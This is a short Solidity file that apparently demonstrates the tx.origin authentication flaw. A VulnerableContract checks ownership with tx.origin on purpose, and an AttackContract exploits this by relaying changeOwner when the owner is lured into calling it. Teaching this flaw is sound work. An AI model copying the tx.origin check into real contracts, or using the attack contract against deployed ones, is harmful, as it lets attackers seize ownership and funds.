// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableContract {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _newOwner) public {
        // Vulnerable authentication check using tx.origin
        require(tx.origin == owner, "Not the owner");
        owner = _newOwner;
    }
}

contract AttackContract {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = VulnerableContract(_vulnerableContractAddress);
    }

    function attack(address _newOwner) public {
        // This function will call changeOwner on VulnerableContract
        // Since tx.origin will be the user who initiated the transaction,
        // and not this contract's address, the check in VulnerableContract will pass
        vulnerableContract.changeOwner(_newOwner);
    }
}
